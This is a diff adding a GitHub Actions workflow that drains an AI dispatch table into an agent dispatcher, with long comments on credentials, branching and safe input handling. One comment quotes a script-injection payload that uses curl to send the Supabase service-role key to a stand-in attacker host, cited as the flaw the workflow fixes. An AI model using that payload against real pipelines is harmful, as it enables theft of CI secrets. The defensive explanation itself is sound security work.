@@ -1,0 +1,211 @@
+# THE DELIVERER — drains ai_dispatch into the EXISTING XC dispatcher, on a schedule,
+# with no chat session open anywhere.
+#
+# This is the bridge that never existed. docs/dispatch/MAILBOX_DELIVERY.md:
+# "a deliverer has never existed, and the ledger shows that was a considered
+# decision rather than an oversight." Both halves were already here and did not
+# touch — claude-cloud writes to the ai_dispatch TABLE, while the working
+# dispatcher (dispatch-agent-cloud.yml -> run-agent.mjs -> `grok -p`) reads
+# docs/dispatch/INBOX_XC.md, a git FILE. Rows were therefore never seen by XC at
+# any priority. scripts/dispatch/deliver-inbox.mjs joins the two; run-agent.mjs
+# and inbox-lib.js are reused UNCHANGED.
+#
+# WHY A GITHUB ACTIONS CRON AND NOT A WINDOWS SCHEDULED TASK. It survives the
+# operator's laptop sleeping, needs no machine to be on, and costs nothing on a
+# run that finds nothing. The scheduler itself never calls an LLM: deliver-inbox
+# queries Postgres, and only spawns the agent when a row is actually ready. That
+# is the whole point — the earlier Claude-token burn came from a scheduler that
+# was itself an LLM session.
+#
+# BEFORE ENABLING — add repo secrets (Settings -> Secrets and variables -> ACTIONS,
+# NOT the Variables tab: a token in Variables makes ${{ secrets.X }} resolve to an
+# EMPTY STRING with no error, which has already cost this org a silent CI failure
+# with NPM_TOKEN):
+#   XAI_API_KEY                    the one credential XC needs (GROK_API_KEY also read)
+#   SUPABASE_URL                   the project URL
+#   SUPABASE_SECRET_KEY            an sb_secret_... key (SERVICE_ROLE/SERVICE_KEY also read)
+#   LOOP_GH_PAT                    REUSE the PAT already set up for the T12 build loop
+#
+# Without the Supabase pair the script exits 2 = NOT_CHECKED and the run is a
+# no-op that says so. It never exits 0 on a missing credential: "no credential"
+# is not "nothing queued".
+name: deliver-inbox-cloud
+
+on:
+  workflow_dispatch:
+    inputs:
+      # CONSTRAINED, NOT FREE-FORM — defence in depth behind the env fix below.
+      # A `type: choice` is validated by GitHub against this list before the job
+      # starts, so the value reaching the runner can only ever be one of these
+      # literals and cannot carry shell metacharacters at all. This is the shape
+      # dispatch-agent-cloud.yml already uses for its own `agent` input, which is
+      # precisely why that sibling workflow is NOT vulnerable to the injection
+      # Strix found here: its one shell-interpolated input was already a choice.
+      to:
+        description: 'Which inboxes to drain'
+        required: false
+        type: choice
+        default: 'xc,xc2'
+        options:
+          - 'xc,xc2'
+          - 'xc'
+          - 'xc2'
+      limit:
+        description: 'Max rows to deliver this run'
+        required: false
+        type: choice
+        default: '1'
+        options:
+          - '1'
+          - '3'
+          - '5'
+      dry_run:
+        description: 'Select and print, deliver nothing'
+        type: boolean
+        required: false
+        default: true
+  # ─────────────────────────────────────────────────────────────────────────────
+  # SCHEDULE IS DELIBERATELY COMMENTED OUT ON THE FIRST LANDING.
+  #
+  # MEASURED 2026-09-20: 28 rows currently match the selector, the oldest from
+  # 2026-09-15, 10 of them at priority >= 85. Enabling a 15-minute cron cold would
+  # start spending real xAI tokens against a five-day backlog before anyone has
+  # watched a single delivery complete. The build loop already taught this repo
+  # the cost lesson the expensive way (Beat 64: $1.55 in one beat, and four of
+  # five scheduled runs died at the turn cap with nothing logged).
+  #
+  # So: run it once by hand with dry_run=true, once with dry_run=false and
+  # limit=1, read the reply it writes, THEN uncomment. Same sequence
+  # dispatch-agent-cloud.yml used, and for the same reason.
+  #
+  # schedule:
+  #   - cron: '*/15 * * * *'
+  # ─────────────────────────────────────────────────────────────────────────────
+
+permissions:
+  contents: write
+  pull-requests: write
+
+concurrency:
+  # Never two drains at once. The claim in inbox-lib.js is a compare-and-swap, so
+  # a double run cannot double-deliver a row — but it could dispatch two agents
+  # against the same checkout, and the dispatcher refuses to share a branch.
+  group: deliver-inbox-cloud
+  cancel-in-progress: false
+
+jobs:
+  deliver:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: Checkout (PAT so anything pushed here still triggers CI)
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          token: ${{ secrets.LOOP_GH_PAT }}
+
+      - name: Git identity
+        run: |
+          git config user.name "deliver-inbox[bot]"
+          git config user.email "dispatch@users.noreply.github.com"
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Install the XC CLI
+        run: npm install -g @xai-official/grok
+
+      - name: Write credential file (runner temp, never committed)
+        # run-agent.mjs reads ONE reference file (TRUSTKEYS_ENV_MASTER, KEY=value
+        # per line) rather than raw process.env. This is the adapter, so the
+        # well-tested dispatcher needs zero changes. An unset secret becomes an
+        # empty value, which readKey() already skips.
+        run: |
+          CRED_FILE="$RUNNER_TEMP/.env.master"
+          {
+            echo "XAI_API_KEY=${{ secrets.XAI_API_KEY }}"
+            echo "GROK_API_KEY=${{ secrets.GROK_API_KEY }}"
+            echo "REPID_API_KEY=${{ secrets.REPID_API_KEY }}"
+          } > "$CRED_FILE"
+          echo "TRUSTKEYS_ENV_MASTER=$CRED_FILE" >> "$GITHUB_ENV"
+
+      # THE DISPATCHER REFUSES TO RUN ON `main` — agent output must be isolable
+      # for review. The branch is created BEFORE the run for that reason; doing it
+      # afterwards is the exact bug that made every dispatch-agent-cloud run fail
+      # with exit 3 before 2026-08-28.
+      - name: Create the delivery branch (BEFORE delivering)
+        run: |
+          BRANCH="deliver/$(date -u +%Y%m%d-%H%M%S)"
+          git checkout -b "$BRANCH"
+          echo "DELIVER_BRANCH=$BRANCH" >> "$GITHUB_ENV"
+
+      - name: Drain the inbox
+        id: drain
+        env:
+          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
+          SUPABASE_SECRET_KEY: ${{ secrets.SUPABASE_SECRET_KEY }}
+          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+          DISPATCH_RUNNER: deliver-inbox-cloud
+          # THE INPUTS ARE PASSED AS ENV, NEVER INTERPOLATED INTO THE SCRIPT.
+          #
+          # They were `${{ inputs.to }}` inline in the run: block below, which is a
+          # GitHub Actions script injection (CWE-94) — GitHub substitutes the raw
+          # string into the shell BEFORE bash parses it, so a `to` of
+          #     xc"; curl evil.example -d "$SUPABASE_SECRET_KEY
+          # executes on the runner. Found by Strix on #812 and REPRODUCED before
+          # fixing: the old form printed the key, this form passes the same hostile
+          # string through as one inert literal argv entry.
+          #
+          # This step is exactly where that matters most — it holds the Supabase
+          # SERVICE-ROLE key, which has rolbypassrls=true and therefore ignores every
+          # RLS policy on the project, and TRUSTKEYS_ENV_MASTER points at a file
+          # holding XAI_API_KEY. A shell here is a shell with the keyring.
+          DISPATCH_TO: ${{ inputs.to }}
+          DISPATCH_LIMIT: ${{ inputs.limit }}
+          DISPATCH_DRY_RUN: ${{ inputs.dry_run }}
+        run: |
+          set +e
+          # Array + quoted expansions: metacharacters stay data, never syntax.
+          ARGS=(--to "${DISPATCH_TO:-xc,xc2}" --limit "${DISPATCH_LIMIT:-1}")
+          if [ "$DISPATCH_DRY_RUN" = "true" ]; then ARGS+=(--dry-run); fi
+          node scripts/dispatch/deliver-inbox.mjs "${ARGS[@]}"
+          code=$?
+          echo "deliver_exit=$code" >> "$GITHUB_OUTPUT"
+          exit 0
+
+      - name: Shred credential file
+        if: always()
+        run: rm -f "$TRUSTKEYS_ENV_MASTER"
+
+      - name: Push any transcript the agent produced (never auto-merged)
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.LOOP_GH_PAT }}
+        run: |
+          if [ -z "$(git status --porcelain -- reports/)" ]; then
+            echo "no transcript produced — nothing to push."
+            exit 0
+          fi
+          git add reports/
+          git commit -m "deliver(inbox): transcript (exit ${{ steps.drain.outputs.deliver_exit }})"
+          git push -u origin "$DELIVER_BRANCH"
+          gh pr create --draft \
+            --title "deliver(inbox): dispatch transcript" \
+            --body "Automated ai_dispatch delivery. deliver_exit=${{ steps.drain.outputs.deliver_exit }}. Read the claim manifest first: it names what the agent actually held (reasoning + repo_read, no shell) and whether any execution claim is grounded in evidence. Never auto-merged." \
+            --head "$DELIVER_BRANCH" --base main \
+            || echo "::warning::gh pr create failed (often the account API rate limit). The transcript is COMMITTED AND PUSHED to '$DELIVER_BRANCH' — nothing was lost."
+
+      # EXIT 2 IS NOT A FAILURE. It is NOT_CHECKED — no Supabase credential, so the
+      # inbox could not be observed at all. Going red on it would teach readers
+      # that this workflow's red is background noise, and then a real red reads
+      # the same as the noise. Exactly the conflation that cost the cascade path
+      # 12 days, and that check-hal-penalty-guard was already fixed for.
+      - name: Report the verdict
+        run: |
+          code="${{ steps.drain.outputs.deliver_exit }}"
+          case "$code" in
+            0) echo "VERIFIED — drain completed." ;;
+            2) echo "::warning::NOT_CHECKED — no Supabase credential on this runner. The inbox was not observed; this is not 'nothing queued'." ;;
+            *) echo "::error::FAILED — deliver-inbox exited $code. See the Drain step log."; exit 1 ;;
+          esac
